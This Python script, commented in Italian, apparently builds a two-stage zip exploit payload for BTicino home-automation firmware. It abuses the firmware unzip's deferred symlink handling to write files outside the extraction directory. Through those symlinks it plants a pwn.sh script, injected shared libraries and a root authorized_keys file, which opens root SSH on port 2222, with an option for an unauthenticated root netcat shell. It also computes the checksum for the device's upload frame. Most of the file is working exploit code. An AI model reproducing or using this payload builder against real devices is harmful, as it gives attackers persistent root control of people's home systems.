#!/usr/bin/env python3
"""build_payload.py - genera i DUE zip da inviare al device (payload corretto).

Perche' due zip
---------------
L'`unzip` del firmware e' Info-ZIP 6.00 con la patch Debian dei **deferred
symlinks**: i symlink contenuti in un archivio vengono creati solo alla FINE
dell'estrazione. Se nello stesso zip ci sono anche entry con nome
`symlink/percorso`, unzip prova a scriverle quando il symlink e' ancora un
placeholder (un file vuoto) e fallisce con:

    checkdir error: ... exists but is not directory
    unable to process symlink/percorso

Risultato: `exit=2`, `conf.xml` estratto, ma **nessun file del payload scritto**.
Verificato offline con il binario ARM del firmware (`payload/tools/selftest_symlink.py`).

La soluzione e' separare i due passaggi:

  stage1.zip   conf.xml + symlink  -> crea solo i link
  stage2.zip   conf.xml + file     -> scrive attraverso i link gia' esistenti

Accesso
-------
Default: **dropbear key-only sulla 2222**. stage2 include
`<link>/home/root/.ssh/authorized_keys` (la home di root in /etc/passwd e'
`/home/root`); `pwn.sh` avvia `dropbear -s` e non apre nulla se la chiave manca.
Con `--netcat` si costruisce invece il vecchio payload con shell netcat.

Uso
---
    # default: chiave ~/.ssh/id_hometouch.pub, fw 3.2.5
    python payload/build_payload.py

    # chiave esplicita (file oppure stringa tra virgolette)
    python payload/build_payload.py --ssh-key C:\\Users\\me\\.ssh\\id_hometouch.pub

    # firmware diverso da 3.2.5
    python payload/build_payload.py --fw 3.2.6

    # conf.xml esplicito, destinazione/link personalizzati
    python payload/build_payload.py --conf-xml my_conf.xml --dest /home/bticino/cfg/extra

    # vecchio payload netcat (sconsigliato: root senza autenticazione)
    python payload/build_payload.py --netcat

Output in `payload/work/payload/`:
    stage1.zip, stage2.zip, manifest.json

Il manifest contiene size, `cksum` POSIX e CRC-32 (per riferimento), SHA-256,
modalita' ed elenco entry: e' cio' che serve allo script di invio. Il campo
`cksum` e' il valore da mettere nel frame `#32` (vedi `tools/cksum.py`).
"""
from __future__ import print_function

import argparse
import base64
import hashlib
import json
import os
import secrets
import sys
import zipfile
import zlib

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, os.path.join(HERE, "tools"))
import zipbuild
import cksum as cksum_mod

# Il campo <checksum> del frame `#32` e' il `cksum` POSIX del firmware, NON lo
# zlib.crc32: vedi tools/cksum.py e guida §16.2. Lo zlib.crc32 resta solo come
# metadato informativo nel manifest.

PWN_DROPBEAR = os.path.join(HERE, "pwn.sh")
PWN_NETCAT = os.path.join(HERE, "pwn_netcat.sh")
LIBUTILS = os.path.join(HERE, "lib", "libutils.so.1")
LIBPWN = os.path.join(HERE, "lib", "libpwn.so")
DEFAULT_CONF_ZIP = os.path.join(HERE, "work", "conf_now.zip")
DEFAULT_SSH_KEY = os.path.expanduser("~/.ssh/id_hometouch.pub")
OUT_DIR = os.path.join(HERE, "work", "payload")
DEFAULT_FW = "3.2.5"
MARKER = "PAYLOAD_OK.txt"
KEY_PATHS = (os.path.join("home", "root", ".ssh", "authorized_keys"),)


def crc32(data):
    return zlib.crc32(data) & 0xFFFFFFFF


def sha256(data):
    return hashlib.sha256(data).hexdigest().upper()


def read_conf_xml(args):
    if args.conf_xml:
        return open(args.conf_xml, "rb").read()
    src = args.conf_zip or DEFAULT_CONF_ZIP
    if not os.path.exists(src):
        raise SystemExit(
            "ERRORE: %s non esiste. Scarica la conf dal device (#31 + RETR) "
            "oppure passa --conf-xml." % src)
    with zipfile.ZipFile(src) as z:
        return z.read("conf.xml", pwd=b"bticino")


def check_xml(data):
    head = data[:64]
    if not head.startswith(b"<?xml"):
        raise SystemExit("ERRORE: conf.xml non inizia con <?xml: %r" % head[:20])
    try:
        import xml.etree.ElementTree as ET
        ET.fromstring(data)
    except Exception as exc:
        raise SystemExit("ERRORE: conf.xml non e' XML valido: %s" % exc)


def read_ssh_key(spec):
    """Legge le chiavi pubbliche da file o stringa. Ritorna (testo, lista (tipo, fp)).

    Accetta **piu' righe**: tutte le chiavi finiscono in `authorized_keys`. Utile per
    coprire piu' algoritmi (es. ed25519 + RSA) se un dropbear non ne supporta uno.
    """
    if not spec:
        raise SystemExit(
            "ERRORE: serve --ssh-key (file o stringa).\n"
            "  Esempio: python payload/build_payload.py --ssh-key %%USERPROFILE%%\\.ssh\\id_hometouch.pub\n"
            "  Per il vecchio payload netcat usare --netcat.")
    if os.path.exists(spec):
        raw = open(spec, "rb").read()
    else:
        raw = spec.encode()
    text = raw.decode("utf-8", "replace").strip()
    if not text:
        raise SystemExit("ERRORE: chiave pubblica vuota")
    lines = [l.strip() for l in text.splitlines() if l.strip()]
    if not lines:
        raise SystemExit("ERRORE: chiave pubblica vuota")
    out = []
    meta = []
    for line in lines:
        parts = line.split()
        if len(parts) < 2:
            raise SystemExit("ERRORE: chiave pubblica non valida: %r" % line[:60])
        ktype = parts[0]
        if not (ktype.startswith("ssh-") or ktype.startswith("ecdsa-")
                or ktype.startswith("sk-")):
            raise SystemExit("ERRORE: tipo di chiave non riconosciuto: %s" % ktype)
        try:
            blob = base64.b64decode(parts[1], validate=True)
        except Exception as exc:
            raise SystemExit("ERRORE: base64 della chiave non valido: %s" % exc)
        fp = "SHA256:" + base64.b64encode(hashlib.sha256(blob).digest()).decode().rstrip("=")
        out.append(line)
        meta.append((ktype, fp))
    return ("\n".join(out) + "\n").encode(), meta


def build_stage1(conf_xml, link, mark, dest, marker_dir):
    entries = [{"name": "conf.xml", "data": conf_xml}]
    entries.append({"name": link, "data": dest.encode(), "mode": 0o120777, "store": True})
    if mark:
        entries.append({"name": mark, "data": marker_dir.encode(), "mode": 0o120777, "store": True})
    return zipbuild.build_zip(entries)


def build_stage2(conf_xml, link, mark, fw, marker_payload, mode, ssh_key, pwn_body=None):
    pwn = PWN_DROPBEAR if mode == "dropbear" else PWN_NETCAT
    body = pwn_body if pwn_body is not None else open(pwn, "rb").read()
    entries = [
        {"name": "conf.xml", "data": conf_xml},
        {"name": link + "/.license_ver", "data": (fw + "\n").encode()},
        {"name": link + "/pwn.sh", "data": body, "mode": 0o100755},
        {"name": link + "/usbkey_dir/lib/libutils.so.1",
         "data": open(LIBUTILS, "rb").read(), "mode": 0o100755},
        {"name": link + "/usbkey_dir/lib/libpwn.so",
         "data": open(LIBPWN, "rb").read(), "mode": 0o100755},
        {"name": link + "/usbkey_dir/common-licenses/.keep", "data": b""},
    ]
    if ssh_key and mode == "dropbear":
        for rel in KEY_PATHS:
            entries.append({"name": link + "/" + rel.replace(os.sep, "/"),
                            "data": ssh_key, "mode": 0o100600})
    if mark:
        entries.append({"name": mark + "/" + MARKER, "data": marker_payload, "mode": 0o100644})
    return zipbuild.build_zip(entries)


def validate(path, expect_symlinks, expect_files, fw=None, ssh_key=None):
    """Controlla struttura, CRC, modalita' e contenuto del payload generato."""
    problems = []
    with zipfile.ZipFile(path) as z:
        names = z.namelist()
        for n in names:
            try:
                z.read(n, pwd=b"bticino")
            except Exception as exc:
                problems.append("lettura/CRC fallita su %s: %s" % (n, exc))
        for n in expect_symlinks:
            if n not in names:
                problems.append("manca il symlink %s" % n)
                continue
            info = z.getinfo(n)
            mode = (info.external_attr >> 16) & 0xFFFF
            if (mode & 0o170000) != 0o120000:
                problems.append("%s non e' un symlink (mode 0o%o)" % (n, mode))
        for n in expect_files:
            if n not in names:
                problems.append("manca il file %s" % n)
        # ordine: nello stage1 i symlink devono essere le ultime entry
        if expect_symlinks:
            last = names[-len(expect_symlinks):]
            if last != list(expect_symlinks):
                problems.append("ordine inatteso: %r" % names)
        if fw:
            data = z.read("conf.xml", pwd=b"bticino")  # sblocca anche il resto
            lic = [n for n in names if n.endswith("/.license_ver")]
            if lic:
                got = z.read(lic[0], pwd=b"bticino")
                if got != (fw + "\n").encode():
                    problems.append(".license_ver = %r, atteso %r" % (got, fw + "\n"))
        if ssh_key:
            keynames = [n for n in names if n.endswith("/.ssh/authorized_keys")]
            if not keynames:
                problems.append("manca authorized_keys")
            else:
                kname = keynames[0]
                got = z.read(kname, pwd=b"bticino")
                if got != ssh_key:
                    problems.append("authorized_keys diversa dalla chiave fornita")
                mode = (z.getinfo(kname).external_attr >> 16) & 0xFFFF
                if (mode & 0o777) != 0o600:
                    problems.append("authorized_keys mode 0o%o, atteso 0600" % mode)
        pwn = [n for n in names if n.endswith("/pwn.sh")]
        if pwn:
            mode = (z.getinfo(pwn[0]).external_attr >> 16) & 0xFFFF
            if (mode & 0o777) != 0o755:
                problems.append("pwn.sh mode 0o%o, atteso 0755" % mode)
    return problems


def main(argv=None):
    ap = argparse.ArgumentParser(description="Genera i due zip del payload (stage1 + stage2).")
    ap.add_argument("--conf-zip", default=DEFAULT_CONF_ZIP, help="zip scaricato dal device")
    ap.add_argument("--conf-xml", help="conf.xml esplicito (alternativo a --conf-zip)")
    ap.add_argument("--fw", default=DEFAULT_FW, help="versione firmware, deve combaciare con .license_ver")
    ap.add_argument("--link", default=None, help="nome del symlink (default casuale)")
    ap.add_argument("--mark", default=None, help="nome del symlink di verifica (default casuale)")
    ap.add_argument("--dest", default="/home/bticino/cfg/extra", help="target del symlink principale")
    ap.add_argument("--marker-dir", default="/var/tmp/ftp", help="target del symlink di verifica")
    ap.add_argument("--no-marker", action="store_true", help="non creare il marker di verifica")
    ap.add_argument("--ssh-key", default=None, action="append",
                    help="chiave pubblica (file o stringa; puo' essere ripetuta per piu' chiavi). "
                         "Default: ~/.ssh/id_hometouch.pub")
    ap.add_argument("--password", default=None,
                    help="abilita anche il login con PASSWORD su dropbear (hash $5$ generato qui)")
    ap.add_argument("--no-key", action="store_true",
                    help="non includere authorized_keys (login con sola password)")
    ap.add_argument("--netcat", action="store_true",
                    help="payload legacy con shell netcat (root senza autenticazione)")
    ap.add_argument("--out-dir", default=OUT_DIR)
    args = ap.parse_args(argv)

    for p in (PWN_DROPBEAR, PWN_NETCAT, LIBUTILS, LIBPWN):
        if not os.path.exists(p):
            raise SystemExit("ERRORE: artefatto mancante: %s" % p)

    mode = "netcat" if args.netcat else "dropbear"
    ssh_key = None
    keys = []
    if mode == "dropbear":
        if args.no_key:
            if not args.password:
                raise SystemExit("ERRORE: --no-key richiede anche --password "
                                 "(altrimenti il payload non aprirebbe nulla)")
            print("chiavi ssh   : nessuna (--no-key)")
        else:
            specs = args.ssh_key or ([DEFAULT_SSH_KEY] if os.path.exists(DEFAULT_SSH_KEY) else [None])
            pieces = []
            for spec in specs:
                text, meta = read_ssh_key(spec)
                pieces.append(text)
                keys.extend(meta)
            ssh_key = b"".join(pieces)
    elif args.ssh_key:
        raise SystemExit("ERRORE: --ssh-key non ha senso con --netcat")

    conf_xml = read_conf_xml(args)
    check_xml(conf_xml)

    link = args.link or ("p" + secrets.token_hex(3))
    mark = None if args.no_marker else (args.mark or ("m" + secrets.token_hex(3)))
    if link == mark:
        raise SystemExit("ERRORE: --link e --mark devono essere diversi")

    marker_payload = ("payload ok %s fw=%s\n" % (link, args.fw)).encode()
    s1 = build_stage1(conf_xml, link, mark, args.dest, args.marker_dir)

    # password: hash $5$ generato qui (tools/sha256crypt.py, validato contro openssl)
    pwhash = ""
    if args.password:
        from sha256crypt import sha256_crypt
        salt = "".join(secrets.choice("./0123456789"
                                      "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
                                      "abcdefghijklmnopqrstuvwxyz") for _ in range(16))
        pwhash = sha256_crypt(args.password, salt, 5000)
    pwn_body = None
    if mode == "dropbear":
        pwn_body = (open(PWN_DROPBEAR, "rb").read()
                    .replace(b"@@PWNHASH@@", pwhash.encode()))
    s2 = build_stage2(conf_xml, link, mark, args.fw, marker_payload, mode, ssh_key, pwn_body)

    os.makedirs(args.out_dir, exist_ok=True)
    p1 = os.path.join(args.out_dir, "stage1.zip")
    p2 = os.path.join(args.out_dir, "stage2.zip")
    open(p1, "wb").write(s1)
    open(p2, "wb").write(s2)

    sym1 = [link] + ([mark] if mark else [])
    files2 = [link + "/.license_ver", link + "/pwn.sh",
              link + "/usbkey_dir/lib/libutils.so.1",
              link + "/usbkey_dir/lib/libpwn.so"]
    problems = (validate(p1, sym1, [], args.fw)
                + validate(p2, [], files2, args.fw, ssh_key))
    if problems:
        for p in problems:
            print("ERRORE:", p, file=sys.stderr)
        return 2

    manifest = {
        "fw": args.fw,
        "mode": mode,
        "link": link,
        "mark": mark,
        "dest": args.dest,
        "marker_dir": args.marker_dir,
        "stage1": {
            "file": p1, "size": len(s1), "cksum": cksum_mod.device_cksum(s1),
            "crc32": crc32(s1), "sha256": sha256(s1),
            "entries": zipfile.ZipFile(p1).namelist(),
        },
        "stage2": {
            "file": p2, "size": len(s2), "cksum": cksum_mod.device_cksum(s2),
            "crc32": crc32(s2), "sha256": sha256(s2),
            "entries": zipfile.ZipFile(p2).namelist(),
        },
    }
    if mode == "dropbear":
        manifest["ssh"] = {"keys": [{"type": t, "fingerprint": f} for t, f in keys]}
        if len(keys) == 1:
            # compatibilita' con gli script che leggono i campi singoli
            manifest["ssh"]["type"], manifest["ssh"]["fingerprint"] = keys[0]
        manifest["ssh"]["password_auth"] = bool(pwhash)
        if pwhash:
            # comodo per gli script di accesso: la password e' quella scelta dall'utente
            manifest["ssh"]["password"] = args.password
            manifest["ssh"]["shadow_hash"] = pwhash
    mpath = os.path.join(args.out_dir, "manifest.json")
    with open(mpath, "w", encoding="utf-8") as f:
        json.dump(manifest, f, indent=2)

    print("conf.xml      : %d byte" % len(conf_xml))
    print("fw            : %s" % args.fw)
    if mode == "dropbear":
        metodi = []
        if keys:
            metodi.append("chiave")
        if pwhash:
            metodi.append("password")
        print("modalita'     : dropbear su 2222 (%s)"
              % (" + ".join(metodi) if metodi else "NESSUN metodo: payload inutile!"))
    else:
        print("modalita'     : netcat su 2222 (SENZA autenticazione)")
    if mode == "dropbear":
        for t, f in keys:
            print("chiave ssh    : %s %s" % (t, f))
        if pwhash:
            print("password ssh  : abilitata (hash %s...)" % pwhash[:24])
    print("symlink       : %s -> %s" % (link, args.dest))
    if mark:
        print("marker link   : %s -> %s" % (mark, args.marker_dir))
    print()
    print("stage1.zip    : %6d byte  cksum=%-12d crc32=%-10d sha256=%s"
          % (len(s1), cksum_mod.device_cksum(s1), crc32(s1), sha256(s1)[:16]))
    for n in manifest["stage1"]["entries"]:
        print("                %s" % n)
    print("stage2.zip    : %6d byte  cksum=%-12d crc32=%-10d sha256=%s"
          % (len(s2), cksum_mod.device_cksum(s2), crc32(s2), sha256(s2)[:16]))
    for n in manifest["stage2"]["entries"]:
        print("                %s" % n)
    print()
    print("frame #32     : %s" % cksum_mod.frame_cmd(len(s2), cksum_mod.device_cksum(s2)))
    print("manifest      : %s" % mpath)
    print("OK: struttura, cksum POSIX, CRC e modalita' verificate; nessun contatto col device.")
    return 0


if __name__ == "__main__":
    sys.exit(main())
